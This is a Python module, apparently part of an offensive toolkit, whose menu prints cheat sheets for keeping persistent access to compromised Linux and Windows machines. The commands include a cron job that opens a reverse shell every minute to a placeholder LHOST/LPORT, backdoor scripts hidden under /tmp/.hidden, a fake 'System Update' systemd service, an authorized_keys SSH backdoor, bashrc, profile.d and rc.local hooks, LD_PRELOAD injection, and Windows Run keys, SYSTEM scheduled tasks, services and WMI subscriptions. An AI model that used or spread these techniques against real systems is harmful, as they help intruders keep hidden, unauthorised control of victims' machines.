# persistence module
import os, subprocess
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box

console = Console()

def clr():
    os.system('clear')

def runcmd(cmd, t=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return p.stdout + p.stderr
    except:
        return "[!] failed"

def pause():
    Prompt.ask("\n[dim]enter to continue[/dim]")


def linux_persistence():
    clr()
    console.print("[bold red]=== LINUX PERSISTENCE ===[/bold red]\n")
    
    console.print("[bold yellow]--- Cron Jobs ---[/bold yellow]\n")
    console.print("  basic cron backdoor (reverse shell every minute):")
    console.print('  [cyan](echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'") | crontab -[/cyan]\n')
    console.print("  hidden cron:")
    console.print('  [cyan](crontab -l 2>/dev/null; echo "* * * * * /tmp/.hidden/backup.sh") | crontab -[/cyan]\n')
    
    console.print("[bold yellow]--- Systemd Service ---[/bold yellow]\n")
    console.print("  [cyan]cat > /etc/systemd/system/update.service << EOF[/cyan]")
    console.print("  [cyan][Unit][/cyan]")
    console.print("  [cyan]Description=System Update[/cyan]\n")
    console.print("  [cyan][Service][/cyan]")
    console.print("  [cyan]Type=simple[/cyan]")
    console.print("  [cyan]ExecStart=/tmp/.update/worker[/cyan]")
    console.print("  [cyan]Restart=always[/cyan]")
    console.print("  [cyan]RestartSec=10[/cyan]\n")
    console.print("  [cyan][Install][/cyan]")
    console.print("  [cyan]WantedBy=multi-user.target[/cyan]")
    console.print("  [cyan]EOF[/cyan]\n")
    console.print("  then:")
    console.print("  [cyan]systemctl daemon-reload && systemctl enable update.service && systemctl start update.service[/cyan]\n")
    
    console.print("[bold yellow]--- SSH Key ---[/bold yellow]\n")
    console.print('  [cyan]echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys[/cyan]\n')
    
    console.print("[bold yellow]--- Bash RC ---[/bold yellow]\n")
    console.print("  [cyan]echo \'/tmp/.hidden/backdoor.sh &\' >> ~/.bashrc[/cyan]\n")
    console.print("  for all users:")
    console.print("  [cyan]echo \'/tmp/.hidden/backdoor.sh &\' > /etc/profile.d/update.sh[/cyan]\n")
    
    console.print("[bold yellow]--- rc.local ---[/bold yellow]\n")
    console.print("  [cyan]echo \'/tmp/.hidden/worker &\' >> /etc/rc.local && chmod +x /etc/rc.local[/cyan]\n")
    
    console.print("[bold yellow]--- LD_PRELOAD (stealthy) ---[/bold yellow]\n")
    console.print("  compile shared lib, then:")
    console.print('  [cyan]echo "/tmp/.hidden/lib.so" >> /etc/ld.so.preload[/cyan]\n')
    
    pause()

def windows_persistence():
    clr()
    console.print("[bold red]=== WINDOWS PERSISTENCE ===[/bold red]\n")
    
    console.print("[bold yellow]--- Registry Run Keys ---[/bold yellow]\n")
    console.print('  [cyan]reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "C:\\Windows\\Temp\\update.exe" /f[/cyan]\n')
    console.print("  other locations:")
    console.print("    HKCU\\...\\RunOnce")
    console.print("    HKLM\\...\\Run")
    console.print("    HKLM\\...\\RunServices\n")
    
    console.print("[bold yellow]--- Scheduled Tasks ---[/bold yellow]\n")
    console.print('  [cyan]schtasks /create /tn "SystemUpdate" /tr "C:\\Windows\\Temp\\update.exe" /sc minute /mo 1 /ru SYSTEM[/cyan]\n')
    
    console.print("[bold yellow]--- Service ---[/bold yellow]\n")
    console.print('  [cyan]sc create "SystemUpdate" binPath= "C:\\Windows\\Temp\\update.exe" start= auto[/cyan]\n')
    
    console.print("[bold yellow]--- Startup Folder ---[/bold yellow]\n")
    console.print('  [cyan]copy update.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"[/cyan]\n')
    
    console.print("[bold yellow]--- WMI Event Subscription ---[/bold yellow]\n")
    console.print("  [cyan]wmic /namespace:\\\\root\\subscription path __EventFilter create Name=\"Filter\",EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\",Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0\"[/cyan]\n")
    
    pause()

def run():
    while True:
        clr()
        console.print("[bold red]=== PERSISTENCE ===[/bold red]\n")
        from rich.table import Table
        t = Table(show_header=False, box=box.ROUNDED, border_style="red", padding=(0, 2))
        t.add_column("", style="bold yellow", width=4)
        t.add_column("")
        opts = [
            "Linux Persistence Methods",
            "Windows Persistence Methods",
        ]
        for i, o in enumerate(opts, 1):
            t.add_row(str(i), o)
        t.add_row("", "")
        t.add_row("b", "Back")
        console.print(Panel(t, title="[bold]PERSISTENCE[/bold]", border_style="red"))
        
        try:
            c = int(Prompt.ask("[bold yellow]>[/bold yellow]"))
        except ValueError:
            c = 0
        
        if c == 1: linux_persistence()
        elif c == 2: windows_persistence()
        elif c == 0: return
